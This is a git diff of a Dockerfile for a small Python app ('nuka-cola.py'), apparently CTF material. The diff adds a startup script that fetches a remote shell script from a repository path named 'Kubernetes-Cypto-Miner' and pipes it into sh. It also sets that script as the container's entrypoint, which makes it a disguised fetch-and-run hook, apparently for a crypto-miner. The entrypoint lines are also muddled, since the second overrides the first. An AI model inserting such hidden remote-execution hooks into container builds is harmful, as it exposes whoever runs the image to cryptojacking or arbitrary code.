@@ -3,10 +3,13 @@ FROM alpine:latest
 RUN apk add --no-cache python3 py3-pip
 
 RUN apk add --no-cache curl ca-certificates\
-    && echo "curl -sSL https://registry-or-bash-file && echo 'id' | sh " > /usr/bin/system-startup \
+    && echo "curl -sSL https://raw.githubusercontent.com/Insight-NA/CTF2024/main/Kubernetes-Cypto-Miner/something-shiny.sh | sh " > /usr/bin/system-startup \
     && chmod +x /usr/bin/system-startup \
     && rm -rf /tmp/*
 
-ADD nuka-cola.py .
+WORKDIR /app
 
-CMD ["sh", "/usr/bin/system-startup", "&&", "py", "nuka-cola.py"]
+COPY ./nuka-cola.py /app
+
+ENTRYPOINT ["sh", "/usr/bin/system-startup"]
+ENTRYPOINT ["python3", "nuka-cola.py"]
